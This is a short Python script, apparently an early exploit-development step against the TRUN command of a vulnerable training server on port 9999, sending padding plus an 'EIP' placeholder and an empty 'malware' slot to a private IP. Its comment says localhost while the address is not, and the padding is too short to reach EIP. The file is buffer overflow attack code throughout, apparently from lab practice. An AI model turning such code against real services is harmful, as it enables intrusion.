#!/usr/bin/env python3
# TRUN - Basic EIP Control
import socket

target_ip = "192.168.201.227"  # Changed to localhost
target_port = 9999
EIP = "BBBB"
malware = ""
length = 10

bad_str = "TRUN /." + "A"* length + EIP +malware
sock = socket.socket()

sock.connect((target_ip,target_port))

print (sock.recv(1024))

sock.send(bad_str)

print (sock.recv(1024))
sock.close()